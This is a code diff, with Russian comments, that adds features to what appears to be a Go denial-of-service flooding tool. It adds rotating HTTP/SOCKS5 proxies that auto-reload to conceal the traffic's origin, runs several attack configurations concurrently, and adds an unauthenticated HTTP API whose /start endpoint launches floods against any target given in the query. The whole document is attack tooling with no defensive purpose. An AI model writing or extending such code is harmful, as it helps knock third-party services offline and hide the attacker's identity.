@@ -23,6 +23,8 @@ import (
 	"context"
 	"runtime"
 	"github.com/gorilla/websocket"
+	"golang.org/x/net/proxy"
+	"net/http/pprof"
 )
 
 // #################### CONFIG ####################
@@ -71,12 +73,29 @@ var (
 		Requests uint64
 		Fails    uint64
 	}
+
+	errorLog *log.Logger
+	proxyType = "http" // http|socks5
+	proxyFile = "proxies.txt"
+	attackConfigs []AttackConfig
+	apiServer *http.Server
+)
+
+type AttackConfig struct {
+	Target     string
+	Type       string
+	Threads    int
+	Duration   int
+	Payload    int
+	Headers    string
+}
 )
 
 // #################### MAIN ####################
 func main() {
+	initErrorLogger()
 	parseArgs()
-	loadProxies("proxies.txt")
+	loadProxies(proxyFile)
 
 	log.Printf("🚀 Starting %s attack on %s:%d (Workers: %d, Duration: %ds)",
 		attackType, targetHost, targetPort, threads, duration)
@@ -84,6 +103,21 @@ func main() {
 	stats.StartTime = time.Now()
 	go printStats()
 	go proxyHealthChecker()
+	go autoReloadProxies()
+	go startAPIServer()
+	// --- Множественные атаки (задача 9) ---
+	if len(attackConfigs) > 0 {
+		var wg sync.WaitGroup
+		for _, cfg := range attackConfigs {
+			wg.Add(1)
+			go func(cfg AttackConfig) {
+				defer wg.Done()
+				runAttack(cfg)
+			}(cfg)
+		}
+		wg.Wait()
+		return
+	}
 
 	// Graceful shutdown + динамический пул воркеров
 	stop := make(chan os.Signal, 1)
@@ -331,16 +365,18 @@ func loadProxies(filename string) {
 }
 
 func getProxyFunc() func(*http.Request) (*url.URL, error) {
-	return func(*http.Request) (*url.URL, error) {
+	return func(req *http.Request) (*url.URL, error) {
 		if len(proxyList) == 0 {
 			return nil, nil
 		}
-
 		proxyMutex.RLock()
 		defer proxyMutex.RUnlock()
-
 		index := int(atomic.AddUint32(&proxyIndex, 1)) % len(proxyList)
-		return url.Parse("http://" + proxyList[index])
+		proxyAddr := proxyList[index]
+		if proxyType == "socks5" {
+			return url.Parse("socks5://" + proxyAddr)
+		}
+		return url.Parse("http://" + proxyAddr)
 	}
 }
 
@@ -364,6 +400,110 @@ func checkTargetAvailable() bool {
 	}
 	conn.Close()
 	return true
+}
+
+// --- Логирование ошибок в файл (задача 6) ---
+func initErrorLogger() {
+	f, err := os.OpenFile("errors.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		log.Fatalf("Не удалось создать errors.log: %v", err)
+	}
+	errorLog = log.New(f, "ERROR: ", log.Ldate|log.Ltime|log.Lshortfile)
+}
+
+// --- Автообновление списка прокси (задача 8) ---
+func autoReloadProxies() {
+	for range time.Tick(30 * time.Second) {
+		loadProxies(proxyFile)
+	}
+}
+
+// --- Множественные атаки (задача 9) ---
+func runAttack(cfg AttackConfig) {
+	// Можно расширить: парсинг, запуск воркеров и т.д.
+	// Пока просто пример: запуск одной атаки
+	attackType = cfg.Type
+	targetHost = cfg.Target
+	threads = cfg.Threads
+	duration = cfg.Duration
+	payloadSize = cfg.Payload
+	if cfg.Headers != "" {
+		parseCustomHeaders(cfg.Headers)
+	}
+	stats.StartTime = time.Now()
+	var wg sync.WaitGroup
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	for i := 0; i < threads; i++ {
+		wg.Add(1)
+		go attackWorkerCtx(ctx, &wg)
+	}
+	wg.Wait()
+}
+
+// --- API для управления атаками (задача 10) ---
+func startAPIServer() {
+	mux := http.NewServeMux()
+	mux.HandleFunc("/start", apiStartAttack)
+	mux.HandleFunc("/stop", apiStopAttack)
+	mux.HandleFunc("/status", apiStatus)
+	mux.HandleFunc("/pprof/", pprof.Index)
+	apiServer = &http.Server{Addr: ":8081", Handler: mux}
+	log.Println("API server started on :8081")
+	if err := apiServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+		errorLog.Printf("API server error: %v", err)
+	}
+}
+
+var apiCancel context.CancelFunc
+
+func apiStartAttack(w http.ResponseWriter, r *http.Request) {
+	if apiCancel != nil {
+		w.Write([]byte("Attack already running\n"))
+		return
+	}
+	cfg := AttackConfig{
+		Target:   r.URL.Query().Get("target"),
+		Type:     r.URL.Query().Get("type"),
+		Threads:  parseIntOr(r.URL.Query().Get("threads"), 100),
+		Duration: parseIntOr(r.URL.Query().Get("duration"), 60),
+		Payload:  parseIntOr(r.URL.Query().Get("payload"), 1024),
+		Headers:  r.URL.Query().Get("headers"),
+	}
+	ctx, cancel := context.WithCancel(context.Background())
+	apiCancel = cancel
+	go func() {
+		var wg sync.WaitGroup
+		for i := 0; i < cfg.Threads; i++ {
+			wg.Add(1)
+			go attackWorkerCtx(ctx, &wg)
+		}
+		wg.Wait()
+		apiCancel = nil
+	}()
+	w.Write([]byte("Attack started\n"))
+}
+
+func apiStopAttack(w http.ResponseWriter, r *http.Request) {
+	if apiCancel != nil {
+		apiCancel()
+		apiCancel = nil
+		w.Write([]byte("Attack stopped\n"))
+	} else {
+		w.Write([]byte("No attack running\n"))
+	}
+}
+
+func apiStatus(w http.ResponseWriter, r *http.Request) {
+	w.Write([]byte(fmt.Sprintf("Total: %d, Failed: %d\n", stats.TotalRequests, stats.FailedRequests)))
+}
+
+func parseIntOr(s string, def int) int {
+	v, err := strconv.Atoi(s)
+	if err != nil {
+		return def
+	}
+	return v
 }
 
 // #################### UTILS ####################
